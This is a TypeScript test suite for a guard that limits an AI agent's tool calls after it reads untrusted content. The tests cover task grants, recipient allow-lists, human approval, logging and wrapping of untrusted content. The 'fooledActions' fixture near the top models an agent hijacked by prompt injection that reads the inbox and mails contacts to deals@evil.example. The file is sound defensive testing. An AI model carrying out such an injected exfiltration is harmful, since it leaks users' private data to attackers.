import assert from "node:assert/strict";
import { test } from "node:test";
import { Guard, wrapUntrusted } from "./lab.ts";

// A model that obeys the injected instruction: the worst case.
const fooledActions: [string, Record<string, unknown>][] = [
  ["read_inbox", {}],
  ["send_email", { to: "deals@evil.example", body: "contacts" }],
];

test("summarise task cannot send email at all", () => {
  const guard = new Guard("summarise");
  guard.sawUntrusted("https://reviews.example");
  const results = fooledActions.map(([t, a]) => guard.check(t, a));
  assert.equal(results.some((r) => r.allowed), false);
  assert.match(results[1]!.reason, /not granted/);
});

test("email task blocks unknown recipient", () => {
  const guard = new Guard("email_digest", ["me@company.example"]);
  const d = guard.check("send_email", { to: "deals@evil.example" });
  assert.equal(d.allowed, false);
  assert.match(d.reason, /allow-list/);
});

test("outbound after untrusted content needs approval", () => {
  const guard = new Guard("email_digest", ["me@company.example"]);
  assert.equal(guard.check("send_email", { to: "me@company.example" }).allowed, true);
  guard.sawUntrusted("inbox:message-42");
  const d = guard.check("send_email", { to: "me@company.example" });
  assert.equal(d.allowed, false);
  assert.match(d.reason, /approval/);
});

test("human approval unblocks", () => {
  const guard = new Guard("email_digest", ["me@company.example"], () => true);
  guard.sawUntrusted("inbox:message-42");
  assert.equal(guard.check("send_email", { to: "me@company.example" }).allowed, true);
});

test("prototype keys are not task grants", () => {
  const guard = new Guard("toString");
  assert.equal(guard.check("fetch_page", {}).allowed, false);
});

test("everything is logged", () => {
  const guard = new Guard("summarise");
  guard.sawUntrusted("https://reviews.example");
  guard.check("send_email", { to: "x@y.example" });
  assert.deepEqual(guard.log.map((e) => e.event), ["untrusted_content", "tool_request"]);
  assert.equal(guard.log[1]!.allowed, false);
});

test("wrapping marks the source", () => {
  const w = wrapUntrusted("hello", "https://a.example");
  assert.ok(w.startsWith('<untrusted_content source="https://a.example">'));
  assert.ok(w.endsWith("</untrusted_content>"));
});
